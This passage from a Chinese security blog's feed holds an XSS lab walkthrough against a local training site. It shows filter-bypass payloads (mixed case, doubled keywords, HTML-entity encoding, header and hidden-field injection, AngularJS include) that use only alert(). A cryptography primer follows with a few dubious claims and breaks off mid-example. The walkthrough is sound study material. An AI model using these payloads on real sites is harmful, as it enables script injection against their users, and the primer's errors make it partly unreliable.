onclick=&quot;alert()</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018213639284.png\" alt=\"image-20221018213639284\"></p>\n<p>发现 <code>onclick</code>  被替换成了 <code>o_nclick</code> ，可见，逃逸 + 事件绕过宣告失败。</p>\n<p>竟然一些特殊的事件被 ban，逃逸 script 标签也不行，那么我们需要考虑一种别的标签，想到超链接标签（<strong>同样可以加入 js 代码</strong>）</p>\n<p>因此，尝试使用超链接如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;&gt;<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;javascript:alert()&quot;</span>&gt;</span>a<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/xss_vuln/level5.php?keyword=&quot;&gt;<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;javascript:alert()&quot;</span>&gt;</span>a<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span>&amp;submit=æç´¢</span><br></pre></td></tr></table></figure>\n<p>成功绕过</p>\n<p><img src=\"image-20221018213917443.png\" alt=\"image-20221018213917443\"></p>\n<h2 id=\"xss-href属性绕过\"><a class=\"markdownIt-Anchor\" href=\"#xss-href属性绕过\">#</a> XSS Href 属性绕过</h2>\n<p>第六关，我们照往常一样，写入 XSS 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert()<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>发现和上一题差不多</p>\n<p><img src=\"image-20221018214339051.png\" alt=\"image-20221018214339051\"></p>\n<p>那么，我们直接使用超链接逃逸：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;&gt;<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;javascript:alert()&quot;</span>&gt;</span>a<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/xss_vuln/level6.php?keyword=&quot;&gt;<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;javascript:alert()&quot;</span>&gt;</span>a<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span>&amp;submit=æç´¢</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018214448698.png\" alt=\"image-20221018214448698\"></p>\n<p>好小子，又过滤了 href 属性字段。</p>\n<p>但是我们思考一下，前几次看了源码后发现它都是写死在后台代码中。</p>\n<p>那么会不会这一次同样也是将 <code>script</code> 、 <code>onclick</code> 、 <code>href</code>  硬编码在后台代码中做替换呢？</p>\n<p>由于 php 代码和 SQL 一样，不区大小写，我们尝试：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;&gt;<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">hRef</span>=<span class=\"string\">&quot;javascript:alert()&quot;</span>&gt;</span>a<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/xss_vuln/level6.php?keyword=&quot;&gt;<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">hRef</span>=<span class=\"string\">&quot;javascript:alert()&quot;</span>&gt;</span>a<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span>&amp;submit=æç´¢</span><br></pre></td></tr></table></figure>\n<p>成功绕过</p>\n<p><img src=\"image-20221018214934374.png\" alt=\"image-20221018214934374\"></p>\n<h2 id=\"xss双写绕过\"><a class=\"markdownIt-Anchor\" href=\"#xss双写绕过\">#</a> XSS 双写绕过</h2>\n<p>第 7 关，照往常，不过我们为了一次性观察想要的过滤信息，可以写成这样：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&gt;&lt;a href=&quot;</span>javascript:<span class=\"title function_ invoke__\">alert</span>()<span class=\"string\">&quot;&gt;onclick script&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>\n<p>我们发现， <code>href</code> 、 <code>script</code> 、 <code>on</code>  这三个字符统统被吃掉</p>\n<p><img src=\"image-20221018215624834.png\" alt=\"image-20221018215624834\"></p>\n<p>那么我们有理由猜想，后台代码将其直接匹配之后直接替换成空。</p>\n<p>但往往简单的替换都是只匹配一次，我们可以尝试使用双写绕过：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot; oonnclick=&quot;alert()</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018215915039.png\" alt=\"image-20221018215915039\"></p>\n<h2 id=\"xss-html编码绕过\"><a class=\"markdownIt-Anchor\" href=\"#xss-html编码绕过\">#</a> XSS HTML 编码绕过</h2>\n<p>第 8 关，输入 aaa 查看前台源码：</p>\n<p><img src=\"image-20221018221012248.png\" alt=\"image-20221018221012248\"></p>\n<p>那么我们输入一句话探测：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">javascript:alert() onclick ononclick script</span><br></pre></td></tr></table></figure>\n<p>那么我们可以看到， <code>script</code> 、 <code>onclick</code> 、 <code>ononclick</code> 、 <code>sCRipt</code>  都被过滤</p>\n<p><img src=\"image-20221018221329565.png\" alt=\"image-20221018221329565\"></p>\n<p>那么我们尝试使用更加细粒度的方法 ——<strong>HTML 编码绕过</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">格式： </span><br><span class=\"line\">字符C -----  &amp;#67;</span><br></pre></td></tr></table></figure>\n<p>其中，67 是 C 的 ASCII 编码。</p>\n<p>我们使用字符 C 的 HTML 编码来绕过对 <code>script</code>  中字符 C 的检查：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">javas<span class=\"symbol\">&amp;#67;</span>ript:alert()</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018221658617.png\" alt=\"image-20221018221658617\"></p>\n<h2 id=\"xss-特殊场景逻辑绕过\"><a class=\"markdownIt-Anchor\" href=\"#xss-特殊场景逻辑绕过\">#</a> XSS 特殊场景逻辑绕过</h2>\n<p>第 9 关，我们照常理 <code>aaa</code>  输入看源码</p>\n<p><img src=\"image-20221018222234951.png\" alt=\"image-20221018222234951\"></p>\n<p>输入的 <code>aaa</code>  被替换成了一段文字，链接不合法，那我们输入 <code>http://www.baidu.com</code></p>\n<p><img src=\"image-20221018222425416.png\" alt=\"image-20221018222425416\"></p>\n<p>成功控制 href 属性值，那么我们可以尝试一句话探测：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">javascript:alert();onclick oonnclick http://www.baidu.com</span><br></pre></td></tr></table></figure>\n<p>可以看到，我们的 <code>script</code> 、 <code>onclick</code> 、 <code>oonnclick</code>  均被过滤</p>\n<p><img src=\"image-20221018222603234.png\" alt=\"image-20221018222603234\"></p>\n<p>尝试<strong> HTML 编码</strong>，并使用 <code>//</code>  注释掉后面的正常链接。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">javas<span class=\"symbol\">&amp;#67;</span>ript:alert();//http://www.baidu.com</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018222900374.png\" alt=\"image-20221018222900374\"></p>\n<h2 id=\"xss隐藏字段绕过\"><a class=\"markdownIt-Anchor\" href=\"#xss隐藏字段绕过\">#</a> XSS 隐藏字段绕过</h2>\n<p>第 10 关，乍一看，完全没有输入框做交互</p>\n<p><img src=\"image-20221018230848936.png\" alt=\"image-20221018230848936\"></p>\n<p>直接查看前台源码：</p>\n<p><img src=\"image-20221018230921199.png\" alt=\"image-20221018230921199\"></p>\n<p>这三个 <code>input</code>  框，其 type 属性全都是 <code>hidden</code></p>\n<p>那么，我们全都请求一遍，看看哪个能被我们控制？</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">view-source:http://127.0.0.1/xss_vuln/level10.php?t_link=t_link&amp;t_history=t_history&amp;t_sort=t_sort</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018231130250.png\" alt=\"image-20221018231130250\"></p>\n<p>我们发现 t_sort 可以被我们控制，那么就有一句话探测：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">t_sort=<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert() onclick oonnclick href<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018231258683.png\" alt=\"image-20221018231258683\"></p>\n<p>我们发现过滤了尖括号，那么 <code>标签绕过法</code> 都没有用了，那我们可以尝试 <code>事件法</code>  —— <code>onclick</code></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">t_sort=&quot; onclick=&quot;alert()</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/xss_vuln/level10.php?t_sort=&quot; onclick=&quot;alert()</span><br></pre></td></tr></table></figure>\n<p>接着，使用 <code>firebug</code>  把 <code>hidden</code>  属性删掉</p>\n<p><img src=\"image-20221018231746353.png\" alt=\"image-20221018231746353\"></p>\n<p>点击显示出来的输入框，触发 <code>onclick</code>  事件，成功绕过</p>\n<p><img src=\"image-20221018231812669.png\" alt=\"image-20221018231812669\"></p>\n<p>还有一种解法就是，复写 type 属性</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">t_sort=&quot; onclick=&quot;alert()&quot; type=&quot;abc</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018232455601.png\" alt=\"image-20221018232455601\"></p>\n<p><img src=\"image-20221018232546685.png\" alt=\"image-20221018232546685\"></p>\n<p>发现可以直接令后面的 <code>type=&quot;hidden&quot;</code>  失效，也是一种妙招。</p>\n<h2 id=\"http头部xss\"><a class=\"markdownIt-Anchor\" href=\"#http头部xss\">#</a> HTTP 头部 XSS</h2>\n<p>来看第 11 关，查看前台源码：</p>\n<p><img src=\"image-20221018232940761.png\" alt=\"image-20221018232940761\"></p>\n<p>发现和上一关的 <code>url</code>  有关，我们猜想这应该就是 <code>HTTP</code>  请求的 <code>Referer</code></p>\n<p>打开 BP 从第 10 关成功后抓包</p>\n<p><img src=\"image-20221018233046231.png\" alt=\"image-20221018233046231\"></p>\n<p>送入 Repeater</p>\n<p><img src=\"image-20221018233250214.png\" alt=\"image-20221018233250214\"></p>\n<p>发现 <code>value</code>  的值可以被我们通过操纵 <code>Referer</code>  控制</p>\n<p>那么就有：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018233433214.png\" alt=\"image-20221018233433214\"></p>\n<p><strong>尖括号被过滤</strong>，那么我们尝试 <code>onclick</code> ，并且令后面的隐藏 type 失效</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot; onclick=&quot;alert()&quot; type=&quot;xxx</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018233637999.png\" alt=\"image-20221018233637999\"></p>\n<p>成功绕过</p>\n<p><img src=\"image-20221018233745758.png\" alt=\"image-20221018233745758\"></p>\n<p>同样地，来到第 12 关，查看源码：</p>\n<p><img src=\"image-20221018234102814.png\" alt=\"image-20221018234102814\"></p>\n<p>抓包看看是哪个字段：</p>\n<p><img src=\"image-20221018234021464.png\" alt=\"image-20221018234021464\"></p>\n<p>同样原理，构造 onclick 事件：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot; onclick=&quot;alert()&quot; type=&quot;xxx</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018234212386.png\" alt=\"image-20221018234212386\"></p>\n<p>来到第 13 关，查看源码：</p>\n<p><img src=\"image-20221018234330771.png\" alt=\"image-20221018234330771\"></p>\n<p>多了个 t_cook 字段，那么我们请求之：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/xss_vuln/level13.php?t_cook=t_cook</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018234524828.png\" alt=\"image-20221018234524828\"></p>\n<p>抓包，送入 <code>repeater</code> ，发现通过修改 <code>Cookie</code>  的 <code>user=xxx</code>  内容就可以控制 <code>value</code>  字段</p>\n<p><img src=\"image-20221018234626124.png\" alt=\"image-20221018234626124\"></p>\n<p>那么就有：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot; onclick=&quot;alert()&quot; type=&quot;xxx</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018234810825.png\" alt=\"image-20221018234810825\"></p>\n<h2 id=\"angularjs绕过\"><a class=\"markdownIt-Anchor\" href=\"#angularjs绕过\">#</a> AngularJS 绕过</h2>\n<p>第 15 关，查看源码：</p>\n<p><img src=\"image-20221018235801293.png\" alt=\"image-20221018235801293\"></p>\n<p>发现头部加载了一个 <code>angular.min.js</code> ，之后使用了 <code>ng-include</code>  来导入了子节点</p>\n<p><img src=\"image-20221019000014552.png\" alt=\"image-20221019000014552\"></p>\n<p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件。</p>\n<p>包含的内容将作为指定元素的子节点。</p>\n<p><code>ng-include</code>  属性的值可以是一个表达式，返回一个文件名。</p>\n<p>默认情况下，包含的文件需要包含在同一个域名下。</p>\n<p><code>注意</code> ：需要使用 <code>单引号</code> 包裹你想要导入的 <code>文件</code>  + <code>参数</code></p>\n<p>如何使用呢？如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/xss_vuln/level15.php?src=1.gif</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019000219191.png\" alt=\"image-20221019000219191\"></p>\n<p>那么我们思考，这个页面可以包含另一个页面进来，我们何不考虑把第一题的页面导入进来，然后给它构造参数 XSS</p>\n<p>这里尝试过单纯地使用 script 标签没用，所以尝试一种新的事件 —— <code>img</code>  标签配合 <code>onerror</code>  事件</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/xss_vuln/level15.php?src=&#x27;level1.php?name=<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">1</span> <span class=\"attr\">onerror</span>=<span class=\"string\">&quot;alert()&quot;</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019000838111.png\" alt=\"image-20221019000838111\"></p>\n<h2 id=\"利用html语法特性绕过\"><a class=\"markdownIt-Anchor\" href=\"#利用html语法特性绕过\">#</a> 利用 HTML 语法特性绕过</h2>\n<p>第 16 关，我们尝试输入一句话探测</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert() href img onclick onerror oonn&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019001400458.png\" alt=\"image-20221019001400458\"></p>\n<p>发现只有 <code>script</code>  标签被过滤</p>\n<p>查看源码发现是被替换成 <code>&amp;nbsp;</code>  空格</p>\n<p><img src=\"image-20221019001457527.png\" alt=\"image-20221019001457527\"></p>\n<p>但是我们还发现，除了替换标签中的 <code>script</code>  之外，还把我们输入中的 <code>空格</code> 全都替换成了 <code>HTML编码的空格</code> 。</p>\n<p>我们不想让标签语句中的空格被替换，那由于 HTML 语法特性，它只 <code>匹配前后</code> 的两个 <code>尖括号</code> ，<strong>中间的语句之间 “隔好几个空格” 或者 “换行” 都无所谓</strong>。</p>\n<p>通过上述实验发现 img 没有过滤，可以用来做标签，那么把语句中的 <code>空格</code> 全部替换为 <code>%0a换行</code> 或 <code>%0d换行</code> :</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;img%0asrc=1%0aonerror=&quot;alert()&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019002059825.png\" alt=\"image-20221019002059825\"></p>\n<h2 id=\"可控变量绕过\"><a class=\"markdownIt-Anchor\" href=\"#可控变量绕过\">#</a> 可控变量绕过</h2>\n<p>第 17 关，发现 a 和 b 是疑似可控的</p>\n<p><img src=\"image-20221019002528450.png\" alt=\"image-20221019002528450\"></p>\n<p>变换其值：</p>\n<p><img src=\"image-20221019002612767.png\" alt=\"image-20221019002612767\"></p>\n<p>那么，我们就可以构造事件，这回换一个使用 <code>onmouseover</code>  事件 (鼠标移动到其上面就触发)</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/xss_vuln/level17.php?arg01=aa&amp;arg02=bbb onmouseover=alert()</span><br></pre></td></tr></table></figure>\n<p>成功绕过</p>\n<p><img src=\"image-20221019002755768.png\" alt=\"image-20221019002755768\"></p>\n<p>第 18 关与其同理，不做演示。</p>\n",
            "tags": [
                "XSS跨站脚本攻击探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/06/G%E8%AE%A1%E5%88%92/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/",
            "url": "https://kiyomijin.github.io/2022/10/06/G%E8%AE%A1%E5%88%92/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/",
            "title": "密码学基础",
            "date_published": "2022-10-06T05:47:55.000Z",
            "content_html": "<h1 id=\"密码学基础\"><a class=\"markdownIt-Anchor\" href=\"#密码学基础\">#</a> 密码学基础</h1>\n<p>密码学有三大原则：<strong>扩散、混淆、雪崩效应</strong></p>\n<ul>\n<li><code>扩散</code> 就是让明文中的每一位影响密文中的许多位，或者说让密文中的每一位受明文中的许多位的影响．这样可以隐蔽明文的统计特性。</li>\n<li><code>混淆</code> 就是将密文与密钥之间的统计关系变得尽可能复杂，使得对手即使获取了关于密文的一些统计特性，也无法推测密钥。使用复杂的非线性代替变换可以达到比较好的混淆效果，而简单的线性代替变换得到的混淆效果则不理想。</li>\n<li><code>雪崩效应（Avalanche effect）</code> 指加密算法【尤其是<strong>块密码</strong> (分组密码) 和加密<strong>散列函数</strong>】的一种理想属性。雪崩效应就是一种不稳定的平衡状态也是加密算法的一种特征，它指明文或密钥的少量变化会引起密文的很大变化。雪崩效应是指当输入发生最微小的改变（例如，反转一个二进制位）时，也会导致输出的剧变（如，输出中一半的二进制位发生反转）。在高品质的块密码中，无论密钥或明文的任何细微变化都应当引起密文的剧烈改变。</li>\n</ul>\n<div class=\"note blue icon-padding simple\"><i class=\"note-icon fas fa-battery-half\"></i><p>目前只有 RSA 算法不具有雪崩效应。</p>\n</div>\n<h2 id=\"分组密码学原理与应用\"><a class=\"markdownIt-Anchor\" href=\"#分组密码学原理与应用\">#</a> 分组密码学原理与应用</h2>\n<h3 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理</h3>\n<p>对称密钥密码体制又称分组密码体制、单密钥密码体制，是 <strong>加密密钥</strong> 和 <strong>解密密钥</strong>  <code>相同</code> 的密码体制。</p>\n<p><code>加密算法</code> 、 <code>解密算法</code> 是<mark class=\"hl-label red\">公开</mark> 的。</p>\n<p><code>加密算法</code> 必须足够 <code>复杂</code> 。</p>\n<p>其 <code>密钥必须保密</code> 并且有足够大的密钥空间，从而使得攻击者在 <code>截取密文</code> 和 <code>知道加密算法</code> 的情况下，仍然 <code>无法还原</code> 出 <code>明文</code> 。</p>\n<p>假设网络中有 <code>n个</code> 使用者，使用者之间共享 <code>1个</code> 秘钥，则共有 <code>n（n-1）/2个</code> 秘钥。</p>\n<p>分组密码典型算法有： <code>DES</code> 、 <code>IDEA</code> 、 <code>AES</code> 。</p>\n<h3 id=\"优点\"><a class=\"markdownIt-Anchor\" href=\"#优点\">#</a> 优点</h3>\n<p><strong>私钥密码算法</strong> <code>处理速度快</code> ，人们常常将其用作 <code>数据加密处理</code> 。</p>\n<h3 id=\"缺点\"><a class=\"markdownIt-Anchor\" href=\"#缺点\">#</a> 缺点</h3>\n<ul>\n<li>密钥 <code>分配</code> 问题</li>\n<li>密钥 <code>管理</code> 问题</li>\n<li>无法认证 <code>源</code></li>\n</ul>\n<h3 id=\"应用\"><a class=\"markdownIt-Anchor\" href=\"#应用\">#</a> 应用</h3>\n<h4 id=\"des64-56\"><a class=\"markdownIt-Anchor\" href=\"#des64-56\">#</a> DES【64-56】</h4>\n<div class=\"note blue icon-padding simple\"><i class=\"note-icon fas fa-battery-half\"></i><p>DES 是分组加密算法，能够支持 64 比特的明文块加密，其密钥长度为 56 比特。</p>\n</div>\n<p><code>三重DES</code> （Triple Data Encryption Algorithm， <code>TDEA</code> ），也称为 <code>3DES</code> 。</p>\n<p>工作机制是使用 DES 对明文进行<mark class=\"hl-label blue\">加密一解密一加密</mark>  操作，即对 DES 加密后的密文进行解密再加密，而解密则相反。</p>\n<p>设 <code>EK()</code>  和 <code>DK()</code>  代表 DES 算法的加密和解密过程，代表 DES 算法使用的密钥， <code>I</code>  代表明文输入， <code>O</code>  代表密文输出。</p>\n<p><strong>TDEA</strong>  <code>加密</code>  操作如下: <mark class=\"hl-label blue\">加密一解密一加密</mark> </p>\n<p><img src=\"image-20221006141353459.png\" alt=\"image-20221006141353459\"></p>\n<p><strong>TDEA</strong>  <code>解密</code>  操作如下: <mark class=\"hl-label blue\">解密一加密一解密</mark> </p>\n<p><img src=\"image-20221006141424648.png\" alt=\"image-20221006141424648\"></p>\n<p><strong>标准定义了三种密钥</strong>（针对<strong>密钥 K1,K2,K3</strong>）选项：</p>\n<ul>\n<li>密钥选项 1:  <code>K1≠K2≠K3</code> ，强度最高，拥有 <code>3 x 56 = 168个</code> 独立的密钥位</li>\n<li>密钥选项 2:  <code>K1≠K2</code> ，但 <code>K3=K1</code> ，强度其次，拥有 <code>2 x 56 = 112个</code> 独立的密钥位</li>\n<li>密钥选项 3:  <code>K1=K2=K3</code> ，强度最弱，拥有 <code>1 x 56 = 56个</code> 独立的密钥位</li>\n</ul>\n<h4 id=\"idea64-128\"><a class=\"markdownIt-Anchor\" href=\"#idea64-128\">#</a> IDEA【64-128】</h4>\n<div class=\"note blue icon-padding simple\"><i class=\"note-icon fas fa-battery-half\"></i><p>IDEA（International Data Encryption Algorithm）是国际数据加密算法的简记，是一个分组加密处理算法，其明文和密文分组都是 64 比特，密钥长度为 128 比特。</p>\n</div>\n<p>该算法是由来学嘉（X.J.Lai）和 Massey 提出的建议标准算法，已在 <code>PGP</code>  中得到应用。</p>\n<p><code> 既可用于加密又可用于解密</code>  ，该算法的设计思想是<mark class=\"hl-label blue\">混合使用来自不同代数群中的运算</mark> 。</p>\n<h4 id=\"aes64-128-192-256\"><a class=\"markdownIt-Anchor\" href=\"#aes64-128-192-256\">#</a> AES【64-128、192、256】</h4>\n<div class=\"note blue icon-padding simple\"><i class=\"note-icon fas fa-battery-half\"></i><p>AES 是确定非保密的、公开的、全球免费使用的分组密码算法。</p>\n</div>\n<p>特点：</p>\n<p>其密码 <code>必须是没有密级</code> 的，绝不能像商业秘密那样来保护它</p>\n<p>算法的全部描述 <code>必须公开披露</code></p>\n<p>密码 <code>必须可以在世界范围内免费使用</code></p>\n<p><code>分组长度</code> 至少为 <code>128比特</code> ， <code>密钥长度</code> 至少为 <code>128、192和256比特</code></p>\n<p>从参与 AES 的候选算法中，最终选择  <code>Rijndael</code>  作为  <code>AES</code></p>\n<p>国产密码中的</p>\n<h4 id=\"sm1128-128\"><a class=\"markdownIt-Anchor\" href=\"#sm1128-128\">#</a> SM1【128-128】</h4>\n<div class=\"note blue icon-padding simple\"><i class=\"note-icon fas fa-battery-half\"></i><p>SM1 算法是一种对称加密算法，分组长度为 128 比特，密钥长度为 128 比特。</p>\n</div>\n<h4 id=\"sm4128-128\"><a class=\"markdownIt-Anchor\" href=\"#sm4128-128\">#</a> SM4【128-128】</h4>\n<div class=\"note blue icon-padding simple\"><i class=\"note-icon fas fa-battery-half\"></i><p>SM4 算法也是一种对称加密算法，分组长度为 128 比特，密钥长度为 128 比特。</p>\n</div>\n<p>加密算法与密钥扩展算法都采用 32 轮非线性迭代结构。</p>\n<p>数据解密和数据加密的算法结构相同，只是轮密钥的使用顺序相反，解密轮密钥是加密轮密钥的逆序。详见 GM/T0002-2012《SM4 分组密码算法》。</p>\n<h4 id=\"数字信封对称密钥公钥\"><a class=\"markdownIt-Anchor\" href=\"#数字信封对称密钥公钥\">#</a> 数字信封（对称密钥 + 公钥）</h4>\n<p>数字信封是一种综合利用了 <code>对称加密技术</code> 和 <code>非对称加密技术</code> 两者的优点进行 <code>信息安全传输</code> 的一种技术。</p>\n<ol>\n<li>发送方采用 <code>对称密钥</code> 来 <code>加密信息内容</code></li>\n<li>发送方再用接收方的 <code>公开密钥</code> 来 <code>加密对称密钥</code> （这部分称数字信封），将它和加密后的信息一起发送给接收方</li>\n<li>接收方先用自己的 <code>私有密钥</code> 打开数字信封，得到 <code>对称密钥</code></li>\n<li>接收方最后使用 <code>对称密钥</code> 解开加密信息。</li>\n</ol>\n<p>数字信封既发挥了对称加密算法速度快、安全性好的优点，又发挥了非对称加密算法密钥管理方便的优点。</p>\n<h2 id=\"公钥密码学原理与应用\"><a class=\"markdownIt-Anchor\" href=\"#公钥密码学原理与应用\">#</a> 公钥密码学原理与应用</h2>\n<h3 id=\"原理-2\"><a class=\"markdownIt-Anchor\" href=\"#原理-2\">#</a> 原理</h3>\n<p>公钥密码体制，也称 <code>非对称密码体制</code> 。</p>\n<p>其基本原理是：在加密和解密的过程中<strong>使用不同的密钥处理</strong>方式。</p>\n<p>其中， <code>加密密钥</code> 可以<mark class=\"hl-label red\">公开</mark> ，而只需要把 <code>解密密钥</code> <strong>安全存放即可</strong>。</p>\n<p>在安全性方面，<strong>即使密码算法公开</strong>，由加密密钥推知解密密钥也是计算不可行的。</p>\n<h3 id=\"优点-2\"><a class=\"markdownIt-Anchor\" href=\"#优点-2\">#</a> 优点</h3>\n<ul>\n<li>密钥 <code>分发方便</code> ，能以公开方式分配加密密钥：如因特网中个人安全通信经常将自己的公钥发布在网页中，方便其他人用它进行安全加密</li>\n<li>密钥 <code>保管量少</code> ：所有发送方共用一个公开秘钥，只要接收方保护好解密秘钥，就能实现安全通信</li>\n<li>支持 <code>数字签名</code></li>\n</ul>\n<p>有三种公钥密码体制类型被证明是安全和有效的，即 <code>RSA</code>  体制、 <code>ELGamal</code>  体制、 <code>椭圆曲线</code> 密码体制（也叫 <code>EC</code> ）。</p>\n<h3 id=\"应用-2\"><a class=\"markdownIt-Anchor\" href=\"#应用-2\">#</a> 应用</h3>\n<h4 id=\"rsan的长度1024长期安全2048\"><a class=\"markdownIt-Anchor\" href=\"#rsan的长度1024长期安全2048\">#</a> RSA【n 的长度 1024，长期安全 2048】</h4>\n<p>RSA 算法是非对称算法，在 RSA 加密算法中， <code>公钥</code> 和 <code>私钥</code> 都可以用于加密消息，<strong>用于 加密消息的密钥 与 用于解密消息的密钥 相反</strong>。</p>\n<p>RSA 算法提供了一种保护网络通信和数据存储的 <code>机密性</code> 、 <code>完整性</code> 、 <code>真实性</code> 和 <code>不可否认性</code> 的方法。</p>\n<p>目前 <code>SSH</code> 、 <code>OpenPGP</code> 、 <code>S/MIME</code> 、 <code>SSL/TLS</code>  网络协议 <code>都依赖于RSA</code>  进行加密和数字签名功能。</p>\n<p>RSA 算法在 <code>浏览器中使用</code> ，能够在不可信任的互联网中建立安全连接。</p>\n<p><code>RSA签名验证</code> 是 <code>网络连接系统</code> 中最常见的执行操作之一。</p>\n<p>RSA 算法基于<mark class=\"hl-label blue\">大整数因子分解的困难性</mark> </p>\n<h5 id=\"rsa计算\"><a class=\"markdownIt-Anchor\" href=\"#rsa计算\">#</a> RSA 计算</h5>\n<ol>\n<li>n=p*q</li>\n<li>φ(n)=(p-1)*(q-1) 求 φ(n)</li>\n<li>e*d mod φ(n) =1 求 e d 其中之一</li>\n<li>c=m^e mod n 加密</li>\n<li>m=c^d mod n 解密</li>\n</ol>\n<h5 id=\"字符说明\"><a class=\"markdownIt-Anchor\" href=\"#字符说明\">#</a> 字符说明</h5>\n<ul>\n<li>p，q 为两个素数，n 为 p，q 乘积。</li>\n<li>φ() 为欧拉函数，φ(n) 为小于或等于 n 的正整数中与 n 互质的数的数目【简单记住 (p-1)*(q-1) 公式就行】</li>\n<li>e 为随机一个整数，d 也是一个数字，题中会给出 e 和 d 其中一个不用纠结，可以用公式 3 求出来 ed 其中之一</li>\n<li>mod 是取余函数，例如 3*5 mod 14，取余就是 1</li>\n<li>c 是密文，m 是明文</li>\n<li d=\"\">公钥为 {e，n}，私钥为</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">例题</span><br><span class=\"line\">考虑RSA密码体制，令p=3，q=11，d=7，m=5，给出密文C的计算过程。</span><br><span class=\"line\">解:</span><br><span class=\"line\">n = 3×11 = 33；</span><br><span class=\"line\">φ(n) = 2×10 = 20；</span><br><span class=\"line\">因为d=7, 根据e*d modφ(n) = 1；</span><br><span class=\"line\">求出e=3；</span><br><span class=\"line\">C = m^e mod n = 53 mod 33 = 26</span><br><span class=\"line\"></span><br><span 